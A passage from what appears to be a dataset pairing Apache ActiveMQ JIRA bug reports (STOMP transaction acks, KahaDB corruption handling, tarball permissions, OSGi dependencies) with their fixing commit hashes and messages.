        at java.lang.Thread.run(Thread.java:745)
* an ERROR message is sent to the client

As far as I can tell this is caused by code in both onStompAck() and onStompNack():
https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=blob;f=activemq-stomp/src/main/java/org/apache/activemq/transport/stomp/ProtocolConverter.java;h=b25860bf6895240c33a8643b6fcc731af126d32e;hb=refs/heads/master#l440

With a STOMP 1.1 ACK/NACK, ackId == null, so the message entry is taken out of this.pedingAcks (sic!).
When the transaction is aborted the message entry is then not put back into this.pedingAcks, so any subsequent ACK/NACK will find pendingAck==null, therefore acked==false, raising an exception.",bd8661796b190ef605458cdd7a0d90d9af4f51a0,"AMQ-6697 Adds a test to show that the described case works

Correctly ACK inside a TX and then Abort and then ACK again outside a TX
to show that the broker will then mark the message as consumed."
13076817,AMQ-6696,"After message has been forwarded to the underlying queues MemoryUsageByteCount is increasing for the topic, would have expected it to return to zero.{code}
<destinationInterceptors>
		  <virtualDestinationInterceptor>
		    <virtualDestinations>
				<compositeTopic name=""target"" forwardOnly=""false"" concurrentSend=""true"" >
				         <forwardTo>
				            <queue physicalName=""queue.one"" />
				            <queue physicalName=""queue.two"" />
				            <queue physicalName=""queue.three"" />
			      </forwardTo>
		</compositeTopic>
           </virtualDestinations>
     </virtualDestinationInterceptor>
</destinationInterceptors>{code}",7413ee00e1d19563cb0273df954ad71ef1433705,[AMQ-6696] zero out usage for forwarded messages such that the original target is no longer referenced. fix and test
13074468,AMQ-6684,"org.json is cat-x and cannot be included as a compile dependency going forward.

org.linkedin:org.linkedin.zookeeper-impl:jar:1.4.0:compile
[INFO] |  \- org.linkedin:org.linkedin.util-groovy:jar:1.7.1:compile
[INFO] |     +- org.slf4j:jul-to-slf4j:jar:1.5.8:compile
[INFO] |     +- org.apache.ant:ant:jar:1.8.4:compile
[INFO] |     |  \- org.apache.ant:ant-launcher:jar:1.8.4:compile
[INFO] |     \- org.json:json:jar:20090211:compile

is used in activemq-leveldb-store and activemq-partition
using curator as a replacement may be a viable option for the zk client dependency.",7cae60eae0e2835222783c770974d83323dd6a10,[AMQ-6684] exclude json cat-x transitive dep
13069467,AMQ-6670,"When the journal is corrupt, for example if it is overwritten with null or zero. The result of reading from corrupt locations is inconsistent. 
Errors occur but not all result in a trip to the IOExceptionHander where the option to stop the broker is available.
ClassCastExceptions and RuntimeExceptions can bubble up to the cursors in error.

{code}ERROR | Failed to page in more queue messages  | org.apache.activemq.broker.region.Queue | ActiveMQ BrokerService[XXXXX] Task-300
java.lang.RuntimeException: java.lang.RuntimeException: java.lang.ClassCastException: org.apache.activemq.store.kahadb.data.KahaTraceCommand cannot be cast to org.apache.activemq.store.kahadb.data.KahaAddMessageCommand
	at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:145){code}

or {code}ERROR | Failed to load message at: 1084:12816246 | org.apache.activemq.store.kahadb.KahaDBStore | ActiveMQ BrokerService[XXXX] Task-702
org.apache.activemq.protobuf.InvalidProtocolBufferException: Protocol message contained an invalid tag (zero).
	at org.apache.activemq.protobuf.InvalidProtocolBufferException.invalidTag(InvalidProtocolBufferException.java:48)
	at org.apache.activemq.protobuf.CodedInputStream.readTag(CodedInputStream.java:75) {code}",053c38f99f910872b16c29e7e145e584b3b0c081,[AMQ-6670] - disable expiry processing that may page in and change the test
13062856,AMQ-6649,"activemq-jdbc-store-5.14.4.jar contains support of MS SQL JDBC driver 4.0.
Could you upgrade to java 8 compliant MS SQL Server JDBC driver 6.1 ?

As a workaround I have copied file META-INF\services\org\apache\activemq\store\jdbc\microsoft_jdbc_driver_4_0_for_sql_server  to META-INF\services\org\apache\activemq\store\jdbc\microsoft_jdbc_driver_6_1_for_sql_server 
This solution is based on AMQ-3914

",58046194d02bdcfe74fc8717457229d571ac4627,"https://issues.apache.org/jira/browse/AMQ-6649

Adding MS SQL jdbc driver 6.1 support"
13050564,AMQ-6625,"KahaDB can recover from kill -9 by replaying the journal from the last checkpoint or by detecting and reapplying partial writes to the index.
However this activity is compromised if the journal or index accepts subsequent writes. It an lead to skipped write batches or skipped partial updates to the index.
The desirable behaviour of treating an IOException as fatal and stopping the broker in the knowledge that it will restart and fully recover needs to treat the first IO error as fatal and by default not accept any further writes.
A more advanced IOException handler can facilitate staying alive in more specific scenarios and reactivate kahadb.",d70852eec8b61e4d847b0d191cd88131bc606e23,[AMQ-6625] fix mock test expectation regression
13045858,AMQ-6610,Runtime configuration - The network connectors reload is not registering the Network connector Mbean,2809befff568f5f8c3c16f1a836c229ef4bf95eb,[AMQ-6610] - fix up brittle jmock test
13043574,AMQ-6603,"When {{PooledConnectionFactory}} is used with Failover transport, insufficient access control settings on the broker result in an excessive number of consumer objects on the broker once the access control settings are properly set. 

Here is an example Spring XML configuration:

{code:xml}
<beans ...>

  <bean id=""jmsConnectionFactory"" class=""org.apache.activemq.ActiveMQConnectionFactory"">
    <property name=""brokerURL"" value=""failover:(tcp://localhost:61616)"" />
    <property name=""userName"" value=""test"" />
    <property name=""password"" value=""test"" />
  </bean>

  <bean id=""pooledConnectionFactory"" class=""org.apache.activemq.pool.PooledConnectionFactory"">
    <property name=""connectionFactory"" ref=""jmsConnectionFactory"" />
    <property name=""maxConnections"" value=""10"" />
  </bean>

  <bean id=""jmsContainer"" class=""org.springframework.jms.listener.DefaultMessageListenerContainer"">
    <property name=""connectionFactory"" ref=""pooledConnectionFactory"" />
    <property name=""destinationName"" value=""TEST"" />
    <property name=""messageListener"" ref=""messageListener"" />
    <property name=""concurrentConsumers"" value=""10"" />
  </bean>

  <bean id=""messageListener"" class=""com.redhat.issues.amq.SpringJmsConsumer"" />

</beans>
{code}

In this configuration we expect only one connection and 10 consumers for {{TEST}} queue, but after following the reproducer steps we see around 10 connections and 100 consumers for the queue on hawtio. In the above configuration Spring DMLC is used but we can reproduce the issue without Spring.",8641928553e0f1d97416fd010c2f7d6f165b3660,"[AMQ-6603] ensure failover does not track consumer creation that fails with an exception, fix and test. Thanks for the test Tadayoshi Sato"
13041430,AMQ-6595,"It seems that the default file mode on the JAR files in the the distribution is {{0600}}, which means that if you have the distribution files owned by, say, {{root}}, but are running as another used (with a separate {{ACTIVEMQ_HOME}} and {{ACTIVEMQ_BASE}}), then the application fails to start, as it cannot read its JAR files.

{noformat}
$ tar tzvf ~/Downloads/apache-activemq-5.14.3-bin.tar.gz | grep '^-rw-------'
-rw-------  0 cshannon domain users  2390 Dec 19 10:41 apache-activemq-5.14.3/examples/amqp/java/pom.xml
-rw-------  0 cshannon domain users  2250 Dec 19 10:41 apache-activemq-5.14.3/examples/mqtt/java/pom.xml
-rw-------  0 cshannon domain users  3251 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-composite-destinations/pom.xml
-rw-------  0 cshannon domain users  3244 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-durable-sub/pom.xml
-rw-------  0 cshannon domain users  3249 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-exclusive-consumer/pom.xml
-rw-------  0 cshannon domain users  3230 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-message-browser/pom.xml
-rw-------  0 cshannon domain users  3243 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-queue-selector/pom.xml
-rw-------  0 cshannon domain users  3216 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-queue/pom.xml
-rw-------  0 cshannon domain users  3246 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-temp-destinations/pom.xml
-rw-------  0 cshannon domain users  3224 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-topic/pom.xml
-rw-------  0 cshannon domain users  2300 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-transaction/pom.xml
-rw-------  0 cshannon domain users  2278 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-wildcard-consumer/pom.xml
-rw-------  0 cshannon domain users  2909 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/pom.xml
-rw-------  0 cshannon domain users  2559 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/java/pom.xml
-rw-------  0 cshannon domain users  2418 Dec 19 10:41 apache-activemq-5.14.3/examples/stomp/java/pom.xml
-rw-------  0 cshannon domain users    33088 Feb  1  2016 apache-activemq-5.14.3/lib/slf4j-api-1.7.13.jar
-rw-------  0 cshannon domain users   170538 Dec 19 10:37 apache-activemq-5.14.3/lib/activemq-spring-5.14.3.jar
-rw-------  0 cshannon domain users  1169877 Dec 19 10:36 apache-activemq-5.14.3/lib/activemq-broker-5.14.3.jar
-rw-------  0 cshannon domain users  1424591 Dec 19 10:35 apache-activemq-5.14.3/lib/activemq-client-5.14.3.jar
-rw-------  0 cshannon domain users    32359 Feb  1  2016 apache-activemq-5.14.3/lib/geronimo-jms_1.1_spec-1.1.1.jar
-rw-------  0 cshannon domain users    50155 Feb  1  2016 apache-activemq-5.14.3/lib/hawtbuf-1.11.jar
-rw-------  0 cshannon domain users    20220 Feb  1  2016 apache-activemq-5.14.3/lib/geronimo-j2ee-management_1.1_spec-1.0.1.jar
-rw-------  0 cshannon domain users   685732 Dec 19 10:35 apache-activemq-5.14.3/lib/activemq-openwire-legacy-5.14.3.jar
-rw-------  0 cshannon domain users    14637 Feb  1  2016 apache-activemq-5.14.3/lib/geronimo-jta_1.0.1B_spec-1.0.1.jar
-rw-------  0 cshannon domain users   665405 Dec 19 10:36 apache-activemq-5.14.3/lib/activemq-kahadb-store-5.14.3.jar
-rw-------  0 cshannon domain users   147874 Apr 28  2016 apache-activemq-5.14.3/lib/activemq-protobuf-1.1.jar
-rw-------  0 cshannon domain users   194851 Dec 19 10:37 apache-activemq-5.14.3/lib/activemq-console-5.14.3.jar
-rw-------  0 cshannon domain users    37292 Dec 19 10:35 apache-activemq-5.14.3/lib/activemq-jaas-5.14.3.jar
-rw-------  0 cshannon domain users   115649 Dec 19 10:40 apache-activemq-5.14.3/lib/activemq-web-5.14.3.jar
-rw-------  0 cshannon domain users    16430 Feb  1  2016 apache-activemq-5.14.3/lib/jcl-over-slf4j-1.7.13.jar
-rw-------  0 cshannon domain users    76321 Dec 19 10:39 apache-activemq-5.14.3/lib/camel/activemq-camel-5.14.3.jar
-rw-------  0 cshannon domain users  1009602 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-core-4.1.9.RELEASE.jar
-rw-------  0 cshannon domain users   359408 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-aop-4.1.9.RELEASE.jar
-rw-------  0 cshannon domain users   712428 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-beans-4.1.9.RELEASE.jar
-rw-------  0 cshannon domain users  1026909 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-context-4.1.9.RELEASE.jar
-rw-------  0 cshannon domain users   259078 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-expression-4.1.9.RELEASE.jar
-rw-------  0 cshannon domain users   252921 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-tx-4.1.9.RELEASE.jar
-rw-------  0 cshannon domain users   269749 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-jms-4.1.9.RELEASE.jar
-rw-------  0 cshannon domain users   131184 Nov 22 07:03 apache-activemq-5.14.3/lib/optional/xbean-spring-4.2.jar
-rw-------  0 cshannon domain users    20955 Dec 19 10:37 apache-activemq-5.14.3/lib/optional/activemq-pool-5.14.3.jar
-rw-------  0 cshannon domain users    52591 Dec 19 10:37 apache-activemq-5.14.3/lib/optional/activemq-jms-pool-5.14.3.jar
-rw-------  0 cshannon domain users   111969 Feb  1  2016 apache-activemq-5.14.3/lib/optional/commons-pool2-2.4.2.jar
-rw-------  0 cshannon domain users   102578 Apr 28  2016 apache-activemq-5.14.3/lib/optional/activeio-core-3.1.4.jar
-rw-------  0 cshannon domain users   179452 Dec 19 10:36 apache-activemq-5.14.3/lib/optional/activemq-jdbc-store-5.14.3.jar
-rw-------  0 cshannon domain users   303658 May 23  2016 apache-activemq-5.14.3/lib/optional/commons-net-3.5.jar
-rw-------  0 cshannon domain users   973038 Dec 19 10:37 apache-activemq-5.14.3/lib/optional/activemq-leveldb-store-5.14.3.jar
-rw-------  0 cshannon domain users  5577112 Feb  1  2016 apache-activemq-5.14.3/lib/optional/scala-library-2.11.0.jar
-rw-------  0 cshannon domain users    27253 Feb  1  2016 apache-activemq-5.14.3/lib/optional/hawtbuf-proto-1.11.jar
-rw-------  0 cshannon domain users    82869 Feb  1  2016 apache-activemq-5.14.3/lib/optional/hawtdispatch-scala-2.11-1.22.jar
-rw-------  0 cshannon domain users   119139 Feb  1  2016 apache-activemq-5.14.3/lib/optional/hawtdispatch-1.22.jar
-rw-------  0 cshannon domain users     9242 Feb  1  2016 apache-activemq-5.14.3/lib/optional/leveldb-api-0.6.jar
-rw-------  0 cshannon domain users   228800 Feb  1  2016 apache-activemq-5.14.3/lib/optional/leveldb-0.6.jar
-rw-------  0 cshannon domain users  1795936 Feb  1  2016 apache-activemq-5.14.3/lib/optional/guava-12.0.jar
-rw-------  0 cshannon domain users    56364 Feb  1  2016 apache-activemq-5.14.3/lib/optional/leveldbjni-1.8.jar
-rw-------  0 cshannon domain users    19705 Feb  1  2016 apache-activemq-5.14.3/lib/optional/hawtjni-runtime-1.9.jar
-rw-------  0 cshannon domain users   704708 Feb  1  2016 apache-activemq-5.14.3/lib/optional/snappy-java-1.1.2.jar
-rw-------  0 cshannon domain users    48720 Feb  1  2016 apache-activemq-5.14.3/lib/optional/snappy-0.2.jar
-rw-------  0 cshannon domain users   258875 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jackson-core-2.6.3.jar
-rw-------  0 cshannon domain users    46989 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jackson-annotations-2.6.3.jar
-rw-------  0 cshannon domain users  1170801 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jackson-databind-2.6.3.jar
-rw-------  0 cshannon domain users   588337 Feb  1  2016 apache-activemq-5.14.3/lib/optional/commons-collections-3.2.2.jar
-rw-------  0 cshannon domain users   284220 Feb  1  2016 apache-activemq-5.14.3/lib/optional/commons-lang-2.6.jar
-rw-------  0 cshannon domain users   233859 May 23  2016 apache-activemq-5.14.3/lib/optional/commons-beanutils-1.9.2.jar
-rw-------  0 cshannon domain users   449505 Feb  1  2016 apache-activemq-5.14.3/lib/optional/velocity-1.7.jar
-rw-------  0 cshannon domain users   207408 Feb  1  2016 apache-activemq-5.14.3/lib/optional/org.apache.servicemix.bundles.josql-1.5_5.jar
-rw-------  0 cshannon domain users   129265 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jasypt-1.9.2.jar
-rw-------  0 cshannon domain users   102718 Dec 19 10:36 apache-activemq-5.14.3/lib/optional/activemq-mqtt-5.14.3.jar
-rw-------  0 cshannon domain users   127821 Feb  1  2016 apache-activemq-5.14.3/lib/optional/hawtdispatch-transport-1.22.jar
-rw-------  0 cshannon domain users   108429 Dec 19 10:36 apache-activemq-5.14.3/lib/optional/activemq-stomp-5.14.3.jar
-rw-------  0 cshannon domain users    25348 Dec 19 10:38 apache-activemq-5.14.3/lib/optional/activemq-partition-5.14.3.jar
-rw-------  0 cshannon domain users    47974 Feb  1  2016 apache-activemq-5.14.3/lib/optional/org.linkedin.zookeeper-impl-1.4.0.jar
-rw-------  0 cshannon domain users   792964 Feb  1  2016 apache-activemq-5.14.3/lib/optional/zookeeper-3.4.6.jar
-rw-------  0 cshannon domain users   489884 Feb  1  2016 apache-activemq-5.14.3/lib/optional/log4j-1.2.17.jar
-rw-------  0 cshannon domain users   153425 Feb  1  2016 apache-activemq-5.14.3/lib/optional/org.linkedin.util-core-1.4.0.jar
-rw-------  0 cshannon domain users     8704 Feb  1  2016 apache-activemq-5.14.3/lib/optional/slf4j-log4j12-1.7.13.jar
-rw-------  0 cshannon domain users  1655658 Dec 19 10:38 apache-activemq-5.14.3/lib/optional/activemq-runtime-config-5.14.3.jar
-rw-------  0 cshannon domain users   128383 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jaxb2-basics-runtime-0.6.4.jar
-rw-------  0 cshannon domain users   169534 Dec 19 10:38 apache-activemq-5.14.3/lib/optional/activemq-amqp-5.14.3.jar
-rw-------  0 cshannon domain users   717280 Dec 15 14:37 apache-activemq-5.14.3/lib/optional/proton-j-0.16.0.jar
-rw-------  0 cshannon domain users    14136 Dec 19 10:39 apache-activemq-5.14.3/lib/optional/activemq-log4j-appender-5.14.3.jar
-rw-------  0 cshannon domain users   105051 Dec 19 10:38 apache-activemq-5.14.3/lib/optional/activemq-http-5.14.3.jar
-rw-------  0 cshannon domain users   736658 Nov 14 07:36 apache-activemq-5.14.3/lib/optional/httpclient-4.5.2.jar
-rw-------  0 cshannon domain users   327373 Nov 14 07:36 apache-activemq-5.14.3/lib/optional/httpcore-4.4.5.jar
-rw-------  0 cshannon domain users   263965 Feb  1  2016 apache-activemq-5.14.3/lib/optional/commons-codec-1.9.jar
-rw-------  0 cshannon domain users   549133 Nov 14 07:36 apache-activemq-5.14.3/lib/optional/xstream-1.4.9.jar
-rw-------  0 cshannon domain users   120069 Feb  1  2016 apache-activemq-5.14.3/lib/optional/xpp3-1.1.4c.jar
-rw-------  0 cshannon domain users    44303 Dec 19 10:39 apache-activemq-5.14.3/lib/optional/activemq-shiro-5.14.3.jar
-rw-------  0 cshannon domain users   379541 Feb  1  2016 apache-activemq-5.14.3/lib/optional/shiro-core-1.2.4.jar
-rw-------  0 cshannon domain users    25565 Feb  1  2016 apache-activemq-5.14.3/lib/optional/shiro-spring-1.2.4.jar
-rw-------  0 cshannon domain users   174167 Feb  1  2016 apache-activemq-5.14.3/lib/optional/commons-dbcp2-2.1.1.jar
-rw-------  0 cshannon domain users   204950 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jmdns-3.4.1.jar
-rw-------  0 cshannon domain users    37477 Feb  1  2016 apache-activemq-5.14.3/lib/optional/geronimo-j2ee-connector_1.5_spec-2.0.0.jar
-rw-------  0 cshannon domain users    82930 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-oxm-4.1.9.RELEASE.jar
-rw-------  0 cshannon domain users    87770 Nov 14 07:36 apache-activemq-5.14.3/lib/optional/jettison-1.3.8.jar
-rw-------  0 cshannon domain users    48057 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jasypt-spring31-1.9.2.jar
-rw-------  0 cshannon domain users    22488 Feb  1  2016 apache-activemq-5.14.3/lib/optional/insight-log-core-1.2.0.Beta4.jar
-rw-------  0 cshannon domain users   115489 Feb  1  2016 apache-activemq-5.14.3/lib/optional/insight-log4j-1.2.0.Beta4.jar
-rw-------  0 cshannon domain users   126960 Sep 12 08:04 apache-activemq-5.14.3/lib/extra/mqtt-client-1.14.jar
-rw-------  0 cshannon domain users  2803647 Feb  1  2016 apache-activemq-5.14.3/lib/web/jetty-all-9.2.13.v20150730.jar
-rw-------  0 cshannon domain users   219683 Feb  1  2016 apache-activemq-5.14.3/lib/web/rome-1.0.jar
-rw-------  0 cshannon domain users   153253 Feb  1  2016 apache-activemq-5.14.3/lib/web/jdom-1.0.jar
-rw-------  0 cshannon domain users   786528 Feb  1  2016 apache-activemq-5.14.3/lib/web/spring-webmvc-4.1.9.RELEASE.jar
-rw-------  0 cshannon domain users   722282 Feb  1  2016 apache-activemq-5.14.3/lib/web/spring-web-4.1.9.RELEASE.jar
-rw-------  0 cshannon domain users   244274 Feb  1  2016 apache-activemq-5.14.3/lib/web/tomcat-servlet-api-8.0.24.jar
-rw-------  0 cshannon domain users    36603 Feb  1  2016 apache-activemq-5.14.3/lib/web/tomcat-websocket-api-8.0.24.jar
-rw-------  0 cshannon domain users    12452 Feb  1  2016 apache-activemq-5.14.3/lib/web/geronimo-annotation_1.0_spec-1.1.1.jar
-rw-------  0 cshannon domain users    53297 Feb  1  2016 apache-activemq-5.14.3/lib/web/asm-5.0.4.jar
-rw-------  0 cshannon domain users    10701 Feb  1  2016 apache-activemq-5.14.3/lib/web/apache-jsp-9.2.13.v20150730.jar
-rw-------  0 cshannon domain users   955429 Feb  1  2016 apache-activemq-5.14.3/lib/web/apache-jsp-8.0.9.M3.jar
-rw-------  0 cshannon domain users   237638 Feb  1  2016 apache-activemq-5.14.3/lib/web/apache-el-8.0.9.M3.jar
-rw-------  0 cshannon domain users  1764622 Feb  1  2016 apache-activemq-5.14.3/lib/web/org.eclipse.jdt.core-3.8.2.v20130121.jar
-rw-------  0 cshannon domain users     3236 Feb  1  2016 apache-activemq-5.14.3/lib/web/apache-jstl-9.2.13.v20150730.jar
-rw-------  0 cshannon domain users    40153 Nov 14 07:36 apache-activemq-5.14.3/lib/web/taglibs-standard-spec-1.2.5.jar
-rw-------  0 cshannon domain users   206430 Nov 14 07:36 apache-activemq-5.14.3/lib/web/taglibs-standard-impl-1.2.5.jar
-rw-------  0 cshannon domain users   326745 Feb 22  2016 apache-activemq-5.14.3/lib/web/jolokia-core-1.3.3.jar
-rw-------  0 cshannon domain users    23931 Feb  1  2016 apache-activemq-5.14.3/lib/web/json-simple-1.1.1.jar
{noformat}",1d15908e71942ced7e4987273846976753a028f6,"https://issues.apache.org/jira/browse/AMQ-6595

Fixing tar permissions so that everything is 0755 or 0644 as it should
be"
13039827,AMQ-6591,"2017-02-02 14:08:55,435 | ERROR | pool-3-thread-1  | WebObserver                      | 131 - org.ops4j.pax.web.pax-web-extender-war - 6.0.2 | Error scanning web bundle org.apache.activemq.activemq-web-console [64]: javax.servlet.annotation.HandlesTypes not found by org.apache.activemq.activemq-web-console [64]
java.lang.ClassNotFoundException: javax.servlet.annotation.HandlesTypes not found by org.apache.activemq.activemq-web-console [64]
	at org.apache.felix.framework.BundleWiringImpl.findClassOrResourceByDelegation(BundleWiringImpl.java:1574) ~[?:?]
	at org.apache.felix.framework.BundleWiringImpl.access$400(BundleWiringImpl.java:79) ~[?:?]
	at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.loadClass(BundleWiringImpl.java:2018) ~[?:?]
	at java.lang.ClassLoader.loadClass(ClassLoader.java:357) ~[?:?]
	at org.apache.felix.framework.Felix.loadBundleClass(Felix.java:1925) ~[?:?]
	at org.apache.felix.framework.BundleImpl.loadClass(BundleImpl.java:978) ~[?:?]
	at org.ops4j.pax.web.extender.war.internal.parser.WebAppParser.servletContainerInitializerScan(WebAppParser.java:354) ~[?:?]
	at org.ops4j.pax.web.extender.war.internal.parser.WebAppParser.parse(WebAppParser.java:109) ~[?:?]
	at org.ops4j.pax.web.extender.war.internal.WebObserver.createExtension(WebObserver.java:145) ~[?:?]
	at org.ops4j.pax.web.extender.war.internal.Activator.doCreateExtension(Activator.java:82) ~[?:?]
	at org.ops4j.pax.web.extender.war.internal.extender.AbstractExtender.createExtension(AbstractExtender.java:259) ~[?:?]
	at org.ops4j.pax.web.extender.war.internal.extender.AbstractExtender.modifiedBundle(AbstractExtender.java:242) ~[?:?]
	at org.ops4j.pax.web.extender.war.internal.extender.AbstractExtender.modifiedBundle(AbstractExtender.java:54) ~[?:?]
	at org.osgi.util.tracker.BundleTracker$Tracked.customizerModified(BundleTracker.java:482) ~[?:?]
	at org.osgi.util.tracker.BundleTracker$Tracked.customizerModified(BundleTracker.java:415) ~[?:?]
",e4efa6f47adafeeb6e12c6e62f210b3016544252,[AMQ-6591] Add missing import
13029726,AMQ-6548,"At ear stop jsm connection consumes messages, although there occured exception
{noformat}
2016-12-15 16:12:58,831 ERROR [org.jboss.as.ejb3.invocation.processInvocation] (default-threads - 23) WFLYEJB0034: EJB Invocation failed on component test.test.mdb for method public void test.test.onMessage(javax.jms.Message): org.jboss.as.ejb3.component.EJBComponentUnavailableException: WFLYEJB0421: Invocation cannot proceed as component is shutting down
        at org.jboss.as.ejb3.component.interceptors.ShutDownInterceptorFactory$1.processInvocation(ShutDownInterceptorFactory.java:59)
        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)
        at org.jboss.as.ejb3.deployment.processors.EjbSuspendInterceptor.processInvocation(EjbSuspendInterceptor.java:53)
        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)
        at org.jboss.as.ejb3.component.interceptors.LoggingInterceptor.processInvocation(LoggingInterceptor.java:66)
        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)
        at org.jboss.as.ee.component.NamespaceContextInterceptor.processInvocation(NamespaceContextInterceptor.java:50)
        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)
        at org.jboss.as.ejb3.component.interceptors.AdditionalSetupInterceptor.processInvocation(AdditionalSetupInterceptor.java:54)
        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)
        at org.jboss.as.ejb3.component.messagedriven.MessageDrivenComponentDescription$5$1.processInvocation(MessageDrivenComponentDescription.java:213)
        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)
        at org.jboss.invocation.ContextClassLoaderInterceptor.processInvocation(ContextClassLoaderInterceptor.java:64)
        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)
        at org.jboss.invocation.InterceptorContext.run(InterceptorContext.java:356)
        at org.wildfly.security.manager.WildFlySecurityManager.doChecked(WildFlySecurityManager.java:634)
        at org.jboss.invocation.AccessCheckingInterceptor.processInvocation(AccessCheckingInterceptor.java:61)
        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)
        at org.jboss.invocation.InterceptorContext.run(InterceptorContext.java:356)
        at org.jboss.invocation.PrivilegedWithCombinerInterceptor.processInvocation(PrivilegedWithCombinerInterceptor.java:80)
        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)
        at org.jboss.invocation.ChainedInterceptor.processInvocation(ChainedInterceptor.java:61)
        at org.jboss.as.ee.component.ViewService$View.invoke(ViewService.java:195)
        at org.jboss.as.ee.component.ViewDescription$1.processInvocation(ViewDescription.java:185)
        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)
        at org.jboss.invocation.ChainedInterceptor.processInvocation(ChainedInterceptor.java:61)
        at org.jboss.as.ee.component.ProxyInvocationHandler.invoke(ProxyInvocationHandler.java:73)
        at test.test$$$view19.onMessage(Unknown Source)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at org.jboss.as.ejb3.inflow.MessageEndpointInvocationHandler.doInvoke(MessageEndpointInvocationHandler.java:139)
        at org.jboss.as.ejb3.inflow.AbstractInvocationHandler.invoke(AbstractInvocationHandler.java:73)
        at test.test$$$endpoint12.onMessage(Unknown Source)
        at org.apache.activemq.ra.MessageEndpointProxy$MessageEndpointAlive.onMessage(MessageEndpointProxy.java:123)
        at org.apache.activemq.ra.MessageEndpointProxy.onMessage(MessageEndpointProxy.java:64)
        at org.apache.activemq.ActiveMQSession.run(ActiveMQSession.java:1041)
        at org.apache.activemq.ra.ServerSessionImpl.run(ServerSessionImpl.java:169)
        at org.jboss.jca.core.workmanager.WorkWrapper.run(WorkWrapper.java:226)
        at org.jboss.threads.SimpleDirectExecutor.execute(SimpleDirectExecutor.java:33)
        at org.jboss.threads.QueueExecutor.runTask(QueueExecutor.java:808)
        at org.jboss.threads.QueueExecutor.access$100(QueueExecutor.java:45)
        at org.jboss.threads.QueueExecutor$Worker.run(QueueExecutor.java:828)
        at java.lang.Thread.run(Thread.java:745)
        at org.jboss.threads.JBossThread.run(JBossThread.java:320)
{noformat}",85181d630c94c7ca7a47cbb40fc55e3f9e27b574,"[AMQ-6548] ensure any pending xa transaction is marked rollback only on delivery failure exception from on message, before delegating to potential clientInternalExceptionListener. Variant of patch applied with additional test - thanks to Andrey Dyachikhin for the patch inspiration"
13022457,AMQ-6515,"When just installing activemq-blueprint in a plain karaf 4.0.7 the following error happens. It seems that javax.inject is missing in the feature activemq-client.

karaf@root()> feature:repo-add activemq 5.15.0-SNAPSHOT
Adding feature url mvn:org.apache.activemq/activemq-karaf/5.15.0-SNAPSHOT/xml/features
karaf@root()> feature:install activemq-blueprint 
Error executing command: Unable to resolve root: missing requirement [root] osgi.identity; osgi.identity=activemq-blueprint; type=karaf.feature; version=""[5.15.0.SNAPSHOT,5.15.0.SNAPSHOT]""; filter:=""(&(osgi.identity=activemq-blueprint)(type=karaf.feature)(version>=5.15.0.SNAPSHOT)(version<=5.15.0.SNAPSHOT))"" [caused by: Unable to resolve activemq-blueprint/5.15.0.SNAPSHOT: missing requirement [activemq-blueprint/5.15.0.SNAPSHOT] osgi.identity; osgi.identity=activemq; type=karaf.feature; version=""[5.15.0.SNAPSHOT,5.15.0.SNAPSHOT]"" [caused by: Unable to resolve activemq/5.15.0.SNAPSHOT: missing requirement [activemq/5.15.0.SNAPSHOT] osgi.identity; osgi.identity=activemq-karaf; type=osgi.bundle; version=""[5.15.0.SNAPSHOT,5.15.0.SNAPSHOT]""; resolution:=mandatory [caused by: Unable to resolve activemq-karaf/5.15.0.SNAPSHOT: missing requirement [activemq-karaf/5.15.0.SNAPSHOT] osgi.wiring.package; filter:=""(osgi.wiring.package=org.apache.activemq.console)"" [caused by: Unable to resolve org.apache.activemq.activemq-osgi/5.15.0.SNAPSHOT: missing requirement [org.apache.activemq.activemq-osgi/5.15.0.SNAPSHOT] osgi.wiring.package; filter:=""(osgi.wiring.package=javax.inject)""]]]]
